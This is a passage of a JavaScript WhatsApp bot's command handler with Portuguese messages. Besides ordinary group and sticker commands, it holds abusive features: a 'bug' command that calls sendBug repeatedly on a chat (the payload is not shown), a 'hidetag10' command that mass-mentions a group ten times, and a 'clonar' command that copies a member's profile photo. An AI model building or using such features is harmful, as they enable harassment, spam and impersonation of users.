linkgc = await tomioka.groupInviteCode(from)
enviar('https://chat.whatsapp.com/'+linkgc)
break
case 'leave':
if (!isGroup) return enviar ('s√≥ grupo')
if (isGroupAdmins || isOwner) {
tomioka.groupLeave(from)
} else {
enviar('s√≥ adm')
}
break
case 'notif':
if (!isOwner) return enviar('s√≥ dono')
if (!isGroup) return enviar('S√≥ em grupo')
teks = `Notifica√ß√£o de @${sender.split("@")[0]}\n*Mensagem : ${body.slice(7)}*`
group = await tomioka.groupMetadata(from);
member = group['participants']
jids = [];
member.map(async adm => {
jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
text: teks,
contextInfo: {
mentionedJid: jids
},
quoted: tomio, contextInfo: tome
}
await tomioka.sendMessage(from, options, text)
break
case 'togif': 
if (!isQuotedSticker) return enviar(` Voc√™ precisa marcar um sticker animado para isso`)
if ((isMedia && !msg.message.videoMessage || isQuotedSticker) && args.length == 0) {
const encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const mediaaa = await tomioka.downloadAndSaveMediaMessage(encmediaaa)
enviar('espere ')
a = await webp2gifFile(mediaaa)
mp4 = await getBuffer(a.result)
tomioka.sendMessage(from, mp4, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, quoted: tomio, caption: 'ta ai'})
fs.unlinkSync(mediaaa)
}
break
        case 'toimg':
                if (!isQuotedSticker) return enviar('Por favor, marque uma sticker')
qwe = msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated
if (qwe == true) return enviar('S√≥ sticker parada amigo')
                enviar('espere')
                encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                media = await tomioka.downloadAndSaveMediaMessage(encmedia)
                ran = getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                        fs.unlinkSync(media)
                        if (err) return enviar('Erro par√ßa, faz de novo ae')
                        buffer = fs.readFileSync(ran)
                        tomioka.sendMessage(from, buffer, image, {quoted: tomio, contextInfo: tome, thumbnail: fs.readFileSync('./me.jpg'), caption: 'ta ai'})
                        fs.unlinkSync(ran)
                })
                break

break
case 'simi':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (args.length < 1) return enviar ('Onde est√° o texto?')
teks = body.slice(5)
anu = await simih(teks) //fetchJson(`https://api.zeks.xyz/api/simi?apikey=TioTomioka&text=P'})
//if (anu.error) return enviar ('Simi ga tau kak')
enviar(anu)
break
case 'simih':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (args.length < 1) return enviar ('Hmmmm')
if (Number(args[0]) === 1) {
if (isSimi) return enviar ('O modo Simi est√° ativo')
samih.push(from)
fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
enviar('‚úìAtivado com sucesso o modo simi neste grupo‚úì')
} else if (Number(args[0]) === 0) {
samih.splice(from, 1)
fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
enviar('√óDesativado modo simi com sucesso neste grupo√ó')
} else {
enviar('1 para ativar, 0 para desativar')
}
break
case 'chat':
if (args[0].startsWith('08')) return enviar('Coloque o codigo do pa√≠s 55 üáßüá∑')
if (args[0].startsWith('+55')) return enviar('Coloque o codigo do pa√≠s so pode +55 üáßüá∑')
if (args.length < 1) return enviar(`Use assim ${prefix +command} 55xnxx|texto`)
var pc = body.slice(6)
var nomor = pc.split("|")[0];
var org = pc.split("|")[1];
tomioka.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
enviar(`Conversa enviada com sucesso:\n${org},@${nomor}`)
break
case 'bug':
if (!isOwner) return
try {
quotedText = tomioka.message.extendedTextMessage.contextInfo.quotedMessage.conversation
sendBug(from, `${quotedText}`)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
sendBug(from)
} catch {
sendBug(from)
}
break
case 'travar':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (args[0].startsWith('08')) return enviar('Coloque o codigo do pa√≠s 55 üáßüá∑')
if (args[0].startsWith('+55')) return enviar('Coloque o codigo do pa√≠s so pode +55 üáßüá∑')
if (args.length < 1) return enviar(`Use assim ${prefix +command} 55xnxx|texto`)
var pc = body.slice(6)
var nomor = pc.split("|")[0];
var org = 'teste'
tomioka.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
enviar(`Conversa enviada com sucesso:\n${org},@${nomor}`)
break

case 'bemvindo': 
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isGroup) return enviar ('s√≥ grupo')
if (args.length < 1) return enviar ('ativar 1, desativar 0')
if (args[0] === '1') {
if (isWelkom) return enviar ('„Äå ‚ùó „Äçrecurso de bem vindo ativado‚úîÔ∏è')
welkom.push(from)
fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
enviar('„Äå ‚ùó „Äçrecurso de bem vindo ativado‚úîÔ∏è')
}
//Encontrar a posi√ß√£o do grupo no arquivo json
if (args[0] === '0') {
let position = false
Object.keys(welkom).forEach((i) => {
if (welkom[i] === from) {
position = i
}
})
//Apagar o grupo dos dados quando a posi√ß√£o j√° est√° definida 
if (position !== undefined) {
welkom.splice(position, 1)
fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
enviar('„Äå ‚ùó „Äçrecurso de bem vindo desativado‚úîÔ∏è')
}}
break

case 'antilink':
if (!isGroup) return enviar('S√≥ em grupo.')
if (!isGroupAdmins) return enviar('Voc√™ precisa ser adm')
if (!isBotGroupAdmins) return enviar('O bot precisa ser adm')
if (args.length < 1) return enviar('Digite 1 para ativar\nDigite 0 para desativar')
if (Number(args[0]) === 1) {
if (isAntiLink) return enviar('*RECURSOS ANTILINK EST√Å ATIVO*')
antilink.push(from)
fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
enviar('*„Äå ‚ùó „Äçrecurso de antilink ativado‚úîÔ∏è*')
tomioka.sendMessage(from, `*Aten√ß√£o, antilink esta ativo, qualquer um que nao for adm mandar link, sera expulso do gp imediatamente.*`, text)
} else if (Number(args[0]) === 0) {
if (!isAntiLink) return enviar('*J√° est√° desativado!!*')
antilink.splice(from)
fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
enviar('*„Äå ‚ùó „Äçrecurso de antilink desativado‚úîÔ∏è*')
} else {
enviar('1 para ativar, 0 para desativar')
}
break
//botao antilink 
case 'antilink1':
if (!isGroup) return enviar('S√≥ em grupo.')
if (!isGroupAdmins) return enviar('Voc√™ precisa ser adm')
if (!isBotGroupAdmins) return enviar('O bot precisa ser adm')
if (isAntiLink) return enviar('*RECURSOS ANTILINK EST√Å ATIVO*')
antilink.push(from)
fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
enviar('*„Äå ‚ùó „Äçrecurso de antilink ativado‚úîÔ∏è*')
tomioka.sendMessage(from, `*Aten√ß√£o, antilink esta ativo, qualquer um que nao for adm mandar link, sera expulso do gp imediatamente.*`, text)

case 'antilink0':
if (!isAntiLink) return enviar('*J√° est√° desativado!!*')
antilink.splice(from)
fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
enviar('*„Äå ‚ùó „Äçrecurso de antilink desativado‚úîÔ∏è*')

break

case 'clonar':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isOwner) return enviar (mess.only.ownerB)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (args.length < 1) return enviar ('Marque a pessoa que voc√™ quer clonar\n\n*EXEMPLO:* clone @')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar ('Tag cvk')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
try {
pp = await tomioka.getProfilePicture(id)
buffer = await getBuffer(pp)
tomioka.updateProfilePicture(botNumber, buffer)
mentions(`Foto do perfil atualizada com sucesso, usando a foto do perfil @${id.split('@')[0]}`, [jid], true)
} catch (e) {
enviar('Putz, deu erro, a pessoa deve estar sem foto üòî')
}
break
case 'antidel':
if (args[0] == '1') {

antidel = true

enviar(`[üìå] ${command} ativado com sucesso`)

} else if (args[0] == '0') {

antidel = false

enviar(`[üìå] ${command} desativado com sucesso`)

}


break
case 'hidetag':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isadminbot) return enviar ('Quem √© Voc√™?')
var value = body.slice(9)
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: msg
}
tomioka.sendMessage(from, options, text)
break
case 'hidetag10':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isadminbot) return enviar ('Quem √© Voc√™?')
var value = body.slice(10)
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: msg
}
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
tomioka.sendMessage(from, options, text)
break
//
case 'setpp3':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isfrendsowner) return enviar ('Quem √© Voc√™?')
if (!isBotGroupAdmins) return enviar (omess.nly.Badmin)
media = await tomioka.downloadAndSaveMediaMessage(msg)
await tomioka.updateProfilePicture (from, media)
enviar('Alterado com sucesso o √≠cone do Grupo')
break
case 'wait':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
media = await tomioka.downloadMediaMessage(encmedia)
await wait(media).then(res => {
tomioka.sendMessage(from, res.video, video, {quoted: msg, caption: res.teks.trim()})
}).catch(err => {
enviar(err)
})
} else {
enviar('S√≥ uma foto mano')
}
default:
/*if (body == `${prefix}${command}`) {
tesf = `
‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚Ä¢ ‚óÜ ‚Ä¢ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚îÇ    ‚îî N√ÉO ENCONTRADO ‚îò
‚îÇ${command} n√£o existe‚ùó
‚îÇ NICK : ${pushname}      
‚îÇ N√öMERO : @${sender.split("@")[0]}
‚îÇ DIGITE : ${prefix}menu para saber mais
‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚Ä¢ ‚óÜ ‚Ä¢ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ`
enviar(tesf)
}*/

}} catch (e) {
console.log('Error : %s', color(e, 'red'))
}
})
}
starts()
